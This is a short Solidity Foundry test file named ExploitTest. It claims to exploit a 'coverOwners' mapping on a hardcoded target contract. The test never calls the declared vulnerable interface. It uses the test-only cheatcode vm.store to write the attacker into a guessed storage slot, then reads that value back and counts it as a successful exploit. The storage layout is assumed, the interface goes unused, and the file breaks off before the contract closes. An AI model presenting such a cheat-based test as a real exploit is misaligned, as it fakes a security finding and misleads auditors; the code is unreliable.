interface IVulnerable {
    function addCoverOwner(address) external;
    function coverOwners(address) external view returns (bool);
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup required
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Calculate storage slot for coverOwners[attacker]
        // For a mapping, the slot is keccak256(abi.encode(key, mappingSlot))
        // Assuming mapping is at slot 0 (first state variable)
        uint256 mappingSlot = 0;
        bytes32 key = bytes32(uint256(uint160(attacker)));
        bytes32 slot = keccak256(abi.encode(key, mappingSlot));

        // Write true (1) to the storage slot
        vm.store(TARGET, slot, bytes32(uint256(1)));

        // Verify by reading the storage slot directly
        bytes32 storedValue = vm.load(TARGET, slot);
        require(storedValue == bytes32(uint256(1)), "Exploit failed: storage not set correctly");
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
